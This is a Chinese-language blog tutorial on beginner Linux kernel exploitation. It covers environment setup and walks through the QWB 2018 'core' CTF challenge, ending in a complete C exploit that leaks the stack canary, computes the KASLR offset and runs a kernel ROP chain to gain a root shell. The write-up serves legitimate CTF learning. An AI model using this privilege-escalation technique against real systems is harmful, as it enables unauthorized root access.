与用户态程序的pwn不同，Kernel Pwn针对于内核态的漏洞进行，门槛也较用户态pwn更高些。本文分享笔者近来初学Kernel Pwn的经验与教训。

Kernel pwn的环境搭建与基础知识介绍参考[这里](https://arttnba3.cn/2021/02/21/NOTE-0X02-LINUX-KERNEL-PWN-PART-I/#Pre-%E5%AE%89%E8%A3%85%E4%BE%9D%E8%B5%96)，笔者认为是一个很好的kernel pwn入门教程系列，本文提到的搭建环境、题目分析等都可以找到，本文也主要参考这个系列的文章编写，若阅读本文存在任何疑问请移步上面的链接。

CTF题目下载地址：[github](https://github.com/ctf-wiki/ctf-challenges)
``git clone https://github.com/ctf-wiki/ctf-challenges``（内含3道kernel pwn入门题）

# 搭建环境需要注意的问题
1. 笔者的kernel pwn环境在ubuntu 20.04上搭建，与参考文档保持一致。之前使用Kali安装，环境没问题，但题目做不了，rootfs.cpio无法解压。无奈只能在ubuntu上重装一次。建议使用ubuntu 20.04搭建此环境，否则可能产生意想不到且在网上都很难找到解决方法的问题。
2. 运行一个kernel需要打开CPU虚拟化，对于ubuntu 20.04虚拟机，则是打开这两个选项（必须关闭虚拟机才能够勾选）：
![](https://img-blog.csdnimg.cn/3775fa08fc0e4c759b9c4d5f371000d2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16)

# 经验与教训
在一般的pwn中，我们只能跟着题目程序的意思来，各种配各种凑只为执行一次``system("/bin/sh")``；而在Kernel pwn中，我们需要跟着LKM的意思来，在内核中各种配各种凑只为执行一次``commit_creds(prepare_kernel_cred(NULL))``。从这个角度上看，两种形式的pwn在根本上并没有区别。一般题目中都是在自定义的LKM上下文章，所以我们需要重点关注。

另外，根据笔者对两个入门kernel pwn题的初步分析，两道题的cpio文件实际上是经过gzip压缩的，在做题时最好首先file一下确认文件类型，**如果不是cpio文件则在本地调试时则应按照原先的打包方式打包回去**，否则可能会出现无法启动等问题。有的题目会给出打包文件系统的shell文件，需要重点关注。~~（搞了两个小时才知道，我说怎么自己打包的cpio比题目给的大这么多）~~ 如果题目给的内核跑不动，可以尝试将boot.sh中申请的内存改大些（即qemu的-m选项后面，如果64M跑不动就改成128M试试）。

在入门测试时，经常会遇到内核启动不了，一直在重启的情况，将控制台强行叉掉后再开启可能会显示：``qemu-system-x86_64: -s: Failed to find an available port: Address already in use``。这是因为强制关闭后，qemu占用的端口还未被清除。解决方法：使用``lsof -i tcp:<port>``命令查看指定端口的占用情况，在start.sh中看到了qemu后的-s选项说明默认端口为1234。此时即输入``lsof -i tcp:1234``，找到占用的pid将其kill即可：``kill <pid>``

明确了我们需要做什么，再去看题目就不会一脸懵了。

# Kernel pwn首杀——强网杯2018 Core（ROP法）
这是一道经典的Kernel pwn入门题。
``etc/init.d/rcS``文件或根目录下的``init``文件是内核刚刚开始运行时就会执行的文件，题目中一般进行初始化内核环境搭建工作，必须仔细阅读。
在init文件中，我们发现``insmod /core.ko``这个语句，加载了一个core.ko，这个就是自定义的LKM。另外，通过``cat /proc/kallsyms > /tmp/kallsyms``可知，我们可以获取到所有内核函数的符号表，这样我们可以轻松地找到commit_cred函数的地址，又由于boot.sh中并未开启内核的KPTI保护，因此虽然开启了KASLR，但这些内核函数我们可以直接访问。

所以，我们的第一步是遍历``/tmp/kallsyms``文件找到``commit_creds``和``prepare_kernel_cred``两个函数的地址，这一步很简单，会C语言的应该都没有问题。不过为了能够让代码看上去更加简洁，我们使用fscanf函数。该函数从某一个文件标识符中读取字符流并将其转换为我们设定的格式化字符串中的数据。在原理上和scanf函数相似，不过scanf是接受控制台输入的字符。值得注意的是，fscanf函数使用空格分割每一个参数。通过打印``/tmp/kallsyms``文件我们可以发现，该文件由很多行组成，每一行都有3个值，分别为地址、类型和函数名，中间以空格分开。因此我们可使用``fscanf(fd,"%llx%s%s", ...)``来进行逐行读取。同时，充分利用其返回值。fscanf的返回值是成功读取参数的个数，因此当文件读取到末尾时，fscanf由于遇到了EOF，因此返回值为0。我们利用此返回值将fscanf语句写到while循环的条件中，就可以实现文件读取结束后自动退出循环。代码如下（这里的printf打印加入了颜色）：

```c
unsigned long long commit_creds = 0, prepare_kernel_cred = 0;	// address of to key function
// This function is used to get the addresses of two key functions from /tmp/kallsyms
void get_function_address(){
	FILE* sym_table = fopen("/tmp/kallsyms", "r");	// including all address of kernel functions
	if(sym_table == NULL){
		printf("\033[31m\033[1m[x] Error: Cannot open file \"/tmp/kallsyms\"\n\033[0m");
		exit(1);
	}
	unsigned long long addr = 0;
	char type[0x10];
	char func_name[0x100];
	// when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.
	while(fscanf(sym_table, "%llx%s%s", &addr, type, func_name)){
		if(commit_creds && prepare_kernel_cred)		// two addresses of key functions are all found, return directly.
			return;
		if(!strcmp(func_name, "commit_creds")){		// function "commit_creds" found
			commit_creds = addr;
			printf("\033[32m\033[1m[+] Note: Address of function \"commit_creds\" found: \033[0m%#llx\n", commit_creds);
		}else if(!strcmp(func_name, "prepare_kernel_cred")){	// function "prepare_kernel_cred" found
			prepare_kernel_cred = addr;
			printf("\033[32m\033[1m[+] Note: Address of function \"prepare_kernel_cred\" found: \033[0m%#llx\n", prepare_kernel_cred);
		}
	}
}
```

好，现在我们成功获取了这两个函数的地址，那么是不是直接将其作为函数指针调用就行了呢？当然不是，这可是内核的函数，不是用户态程序随随便便就能够调用的。不过好在我们有自定义的LKM可以作为跳板使用。

所有的内核函数都需要通过类似于接口的东西来调用，用户态无法直接调用。使用open函数打开内核进程后通过ioctl函数可以与内核进行通信，内核通过用户的ioctl函数获取用户提供的数据并进行处理，整体上看是一个黑盒。在core.ko中，我们通过IDA反编译可知，在内核装载时就创建了一个名为core的进程：

```c
__int64 init_module()
{
  core_proc = proc_create("core", 438LL, 0LL, &core_fops);
  printk("\x016core: created /proc/core entry\n");
  return 0LL;
}
```

我们在/proc文件夹中能够找到core这个文件，也就是由core.ko创建的内核进程。使用open函数获取到文件指针，将文件指针作为ioctl函数的参数之一即可指定与core进程进行交互。在core.ko中有core_ioctl函数记录了core这个进程提供的3个接口：

```c
__int64 __fastcall core_ioctl(__int64 a1, int a2, __int64 a3)
{
  switch ( a2 )
  {
    case 0x6677889B:
      core_read(a3);
      break;
    case 0x6677889C:
      printk("\x016core: %d\n", a3);
      off = a3;
      break;
    case 0x6677889A:
      printk("\x016core: called core_copy\n");
      core_copy_func(a3);
      break;
  }
  return 0LL;
}
```

这里的第二个参数是请求码，对不同的接口赋予一个编号，在传入数据时顺带传入以确认接入的接口是哪一个。这里看到有3个接口，分别实现不同的功能。我们要执行内核的函数，就必须在内核中下文章，思考如何在内核执行其原有功能时进行我们想要的操作：提权。

在内核ko文件中，我们需要重点关注data节中的file_operations结构体（定义如下）。其中是一系列指针，每一个都对应调用的函数。假如我们自己写一个内核ko模块，想要让它能够作为fd参数传入到read函数中，那么其中的file_operations的read就应该写上我们自己定义在该内核模块中的函数，用户层调用read函数也就相当于该内核模块中调用read函数指针指向的函数。如果这样的函数不存在，则此处填NULL。

```c
struct file_operations {
	struct module *owner;
	loff_t (*llseek) (struct file *, loff_t, int);
	ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);
	ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);
	ssize_t (*read_iter) (struct kiocb *, struct iov_iter *);
	ssize_t (*write_iter) (struct kiocb *, struct iov_iter *);
	int (*iopoll)(struct kiocb *kiocb, struct io_comp_batch *,
			unsigned int flags);
	int (*iterate) (struct file *, struct dir_context *);
	int (*iterate_shared) (struct file *, struct dir_context *);
	__poll_t (*poll) (struct file *, struct poll_table_struct *);
	long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);
	long (*compat_ioctl) (struct file *, unsigned int, unsigned long);
	int (*mmap) (struct file *, struct vm_area_struct *);
	unsigned long mmap_supported_flags;
	int (*open) (struct inode *, struct file *);
	int (*flush) (struct file *, fl_owner_t id);
	int (*release) (struct inode *, struct file *);
	int (*fsync) (struct file *, loff_t, loff_t, int datasync);
	int (*fasync) (int, struct file *, int);
	int (*lock) (struct file *, int, struct file_lock *);
	ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int);
	unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long);
	int (*check_flags)(int);
	int (*flock) (struct file *, int, struct file_lock *);
	ssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int);
	ssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int);
	int (*setlease)(struct file *, long, struct file_lock **, void **);
	long (*fallocate)(struct file *file, int mode, loff_t offset,
			  loff_t len);
	void (*show_fdinfo)(struct seq_file *m, struct file *f);
#ifndef CONFIG_MMU
	unsigned (*mmap_capabilities)(struct file *);
#endif
	ssize_t (*copy_file_range)(struct file *, loff_t, struct file *,
			loff_t, size_t, unsigned int);
	loff_t (*remap_file_range)(struct file *file_in, loff_t pos_in,
				   struct file *file_out, loff_t pos_out,
				   loff_t len, unsigned int remap_flags);
	int (*fadvise)(struct file *, loff_t, loff_t, int);
} __randomize_layout;
```

下面就是core.ko中的file_operations结构体，看到这里定义了write函数，而read函数在ioctl中传入指定的请求码后调用。因此我们可以直接使用write函数调用core模块中的core_write函数。
![](https://img-blog.csdnimg.cn/84bf192ab9f8481aba5f0cf86dca16ff.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16)

在core_write中，我们可以将用户数据拷贝到内核中，存放在core模块中的name部分：

```c
signed __int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  printk("\x016core: called core_writen");
  if ( a3 <= 0x800 && !copy_from_user(name, a2, a3) )
    return (unsigned int)a3;
  printk("\x016core: error copying data from userspacen", a2);
  return 0xFFFFFFF2LL;
}
```

其中的copy_from_user函数就是拷贝函数，第一个参数为拷贝目的地址，在内核空间；第二个参数为拷贝源地址，在用户空间；第三个参数为拷贝字节数。name一共占0x800字节。

在core_read函数中，程序读取64个缓冲区的内容并将其返回给用户空间，其中开始读取的位置是我们可以改变的，这就能够泄露内核空间中该函数的canary。

```c
void __fastcall core_read(__int64 a1)
{
  char *bufptr; // rdi
  __int64 i; // rcx
  char buf[64]; // [rsp+0h] [rbp-50h] BYREF
  unsigned __int64 v5; // [rsp+40h] [rbp-10h]

  v5 = __readgsqword(0x28u);
  printk("\x016core: called core_read\n");
  printk("\x016%d %p\n", off, (const void *)a1);
  bufptr = buf;
  for ( i = 16LL; i; --i )
  {
    *(_DWORD *)bufptr = 0;
    bufptr += 4;
  }
  strcpy(buf, "Welcome to the QWB CTF challenge.\n");
  if ( copy_to_user(a1, &buf[off], 64LL) )
    __asm { swapgs }
}
```

在core_copy_func函数中，有整形溢出，使得我们有构造ROP链的机会：

```c
void __fastcall core_copy_func(signed __int64 a1)
{
  char v1[64]; // [rsp+0h] [rbp-50h] BYREF
  unsigned __int64 v2; // [rsp+40h] [rbp-10h]

  v2 = __readgsqword(0x28u);
  printk("\x016core: called core_writen");
  if ( a1 > 0x3F )
    printk("\x016Detect Overflow");
  else
    qmemcpy(v1, name, (unsigned __int16)a1);    // overflow
}
```

至此，基本的步骤已经明确：
Step 1: 使用core_read函数获取canary
Step 2: 使用core_write函数写入ROP到name
Step 3: 使用core_copy_func函数在栈上追加ROP

由于本内核模块启用了KASLR地址随机化保护机制，因此需要与计算出一个偏移量，题目中给出的vmlinux的commit_creds函数地址为FFFFFFFF8109C8E0（无地址随机化），相减即得偏移量。

为了让内核函数执行完成后能够顺利返回用户态，需要在用户态保存一些寄存器的值。这里引用开头参考资料的代码，这个函数应该首先被执行：（[链接](https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E7%8A%B6%E6%80%81%E4%BF%9D%E5%AD%98)）

```c
size_t user_cs, user_ss, user_rflags, user_sp;
void saveStatus()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}
```

下面只需要解决一个问题：如何构造内核空间的ROP链。

首先我们需要执行prepare_kernel_cred函数，传入rdi=0即可，返回值保存在rax之中。因此要想将rax传入到commit_creds函数中，我们还需要先将rax的值赋值给rdi。vmlinux为我们提供了充足的gadget，很容易就能够找到这些gadget的地址，将其记录在我们的exp中：

```c
const unsigned long long swapgs_popfq_ret = 0xffffffff81a012da;
const unsigned long long movrdirax_callrdx = 0xffffffff8101aa6a;
const unsigned long long poprdx_ret = 0xffffffff810a0f49;
const unsigned long long poprdi_ret = 0xffffffff81000b2f;
const unsigned long long poprcx_ret = 0xffffffff81021e53;
const unsigned long long iretq = 0xFFFFFFFF81A00987;
```

这里没有找到mov rdi, rax; ret的gadget，因此使用call来代替，不过需要注意的是，call指令执行后，会将该指令下一条指令入栈。如果我们在call之后没有进行pop操作，则ret时执行的就不是我们想要的栈上的地址了。因此这里加上了一个pop rcx; ret的gadget，目的是将call指令入栈的地址pop出来以保证ret后继续执行ROP链后面的部分。

当``commit_creds(prepare_kernel_cred(NULL))``执行完毕时，我们还需要引导内核正确地退出到用户态，因此需要在后面加上swapgs和iretq指令，其中iretq指令后面需要依次跟上：返回地址、cs、rflags、sp、ss，后面的4个是我们在程序一开始就保存好的，直接接上即可，返回地址则填写执行``system("/bin/sh")``的地址。这样，从内核态返回后，我们就能够提升进程的权限了。

下面即为最终的exp，在exp中笔者加入了打印地址片段二进制值的函数``print_binary(char* buf, int length)``，便于查看指定地址的值。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/ioctl.h>

unsigned long long commit_creds = 0, prepare_kernel_cred = 0;	// address of to key function
const unsigned long long commit_creds_base = 0xFFFFFFFF8109C8E0;

const unsigned long long swapgs_popfq_ret = 0xffffffff81a012da;
const unsigned long long movrdirax_callrdx = 0xffffffff8101aa6a;
const unsigned long long poprdx_ret = 0xffffffff810a0f49;
const unsigned long long poprdi_ret = 0xffffffff81000b2f;
const unsigned long long poprcx_ret = 0xffffffff81021e53;
const unsigned long long iretq = 0xFFFFFFFF81A00987;

int fd = 0;	// file pointer of process 'core'

void saveStatus();
void get_function_address();
void core_read(char* buf);
void change_off(int off);
void core_copy_func(unsigned long long nbytes);
void print_binary(char* buf, int length);
void shell();

size_t user_cs, user_ss, user_rflags, user_sp;
void saveStatus(){
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

void core_read(char* buf){
	ioctl(fd, 0x6677889B, buf);
}

void change_off(int off){
	ioctl(fd, 0x6677889C, off);
}

void core_copy_func(unsigned long long nbytes){
	ioctl(fd, 0x6677889A, nbytes);
}

// This function is used to get the addresses of two key functions from /tmp/kallsyms
void get_function_address(){
	FILE* sym_table = fopen("/tmp/kallsyms", "r");	// including all address of kernel functions
	if(sym_table == NULL){
		printf("\033[31m\033[1m[x] Error: Cannot open file \"/tmp/kallsyms\"\n\033[0m");
		exit(1);
	}
	unsigned long long addr = 0;
	char type[0x10];
	char func_name[0x100];
	// when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.
	while(fscanf(sym_table, "%llx%s%s", &addr, type, func_name)){
		if(commit_creds && prepare_kernel_cred)		// two addresses of key functions are all found, return directly.
			return;
		if(!strcmp(func_name, "commit_creds")){		// function "commit_creds" found
			commit_creds = addr;
			printf("\033[32m\033[1m[+] Note: Address of function \"commit_creds\" found: \033[0m%#llx\n", commit_creds);
		}else if(!strcmp(func_name, "prepare_kernel_cred")){
			prepare_kernel_cred = addr;
			printf("\033[32m\033[1m[+] Note: Address of function \"prepare_kernel_cred\" found: \033[0m%#llx\n", prepare_kernel_cred);
		}
	}
}

// this is a universal function to print binary data from a char* array
void print_binary(char* buf, int length){
	int index = 0;
	char output_buffer[80];
	memset(output_buffer, '\0', 80);
	memset(output_buffer, ' ', 0x10);
	for(int i=0; i<(length % 16 == 0 ? length / 16 : length / 16 + 1); i++){
		char temp_buffer[0x10];
		memset(temp_buffer, '\0', 0x10);
		sprintf(temp_buffer, "%#5x", index);
		strcpy(output_buffer, temp_buffer);
		output_buffer[5] = ' ';
		output_buffer[6] = '|';
		output_buffer[7] = ' ';
		for(int j=0; j<16; j++){
			if(index+j >= length)
				sprintf(output_buffer+8+3*j, "   ");
			else{
				sprintf(output_buffer+8+3*j, "%02x ", ((int)buf[index+j]) & 0xFF);
				if(!isprint(buf[index+j]))
					output_buffer[58+j] = '.';
				else
					output_buffer[58+j] = buf[index+j];
			}
		}
		output_buffer[55] = ' ';
		output_buffer[56] = '|';
		output_buffer[57] = ' ';
		printf("%s\n", output_buffer);
		memset(output_buffer+58, '\0', 16);
		index += 16;
	}
}

void shell(){
	if(getuid()){
		printf("\033[31m\033[1m[x] Error: Failed to get root, exiting......\n\033[0m");
		exit(1);
	}
	printf("\033[32m\033[1m[+] Getting the root......\033[0m\n");
	system("/bin/sh");
	exit(0);
}

int main(){
	saveStatus();
	fd = open("/proc/core", 2);		// open the process
	if(!fd){
		printf("\033[31m\033[1m[x] Error: Cannot open process \"core\"\n\033[0m");
		exit(1);
	}
	char buffer[0x100] = {0};
	get_function_address();		// get addresses of two key function
	
	unsigned long long base_offset = commit_creds - commit_creds_base;
	printf("\033[34m\033[1m[*] KASLR offset: \033[0m%#llx\n", base_offset);
	
	change_off(0x40);			// change the offset so that we can get canary later
	core_read(buffer);			// get canary
	
	printf("\033[34m\033[1m[*] Contents in buffer here:\033[0m\n");	// print content in buffer
	print_binary(buffer, 0x40);
	
	unsigned long long canary = ((size_t*)&buffer)[0];
	printf("\033[35m\033[1m[*] The value of canary is the first 8 bytes: \033[0m%#llx\n", canary);
	
	size_t ROP[100] = {0};
	memset(ROP, 0, 800);
	int idx = 0;
	for(int i=0; i<10; i++)
		ROP[idx++] = canary;
	ROP[idx++] = poprdi_ret + base_offset;
	ROP[idx++] = 0;			// rdi -> 0
	ROP[idx++] = prepare_kernel_cred;
	ROP[idx++] = poprdx_ret + base_offset;
	ROP[idx++] = poprcx_ret + base_offset;
	ROP[idx++] = movrdirax_callrdx + base_offset;
	ROP[idx++] = commit_creds;
	ROP[idx++] = swapgs_popfq_ret + base_offset;	// step 1 of returning to user mode: swapgs
	ROP[idx++] = 0;
	ROP[idx++] = iretq + base_offset;				// step 2 of returning to user mode: iretq
	// after the iretq: return address, user cs, user rflags, user sp, user ss
	ROP[idx++] = (unsigned long long)shell;
	ROP[idx++] = user_cs;
	ROP[idx++] = user_rflags;
	ROP[idx++] = user_sp;
	ROP[idx++] = user_ss;
	
	printf("\033[34m\033[1m[*] Our rop chain looks like: \033[0m\n");
	print_binary((char*)ROP, 0x100);
	
	write(fd, ROP, 0x800);
	core_copy_func(0xffffffffffff1000);
	return 0;
}
```

编译时注意加上静态编译``--static``和``-masm=intel``选项。打包后运行start.sh，如果出现内核恐慌，则将分配的内存增加一倍再进行尝试。
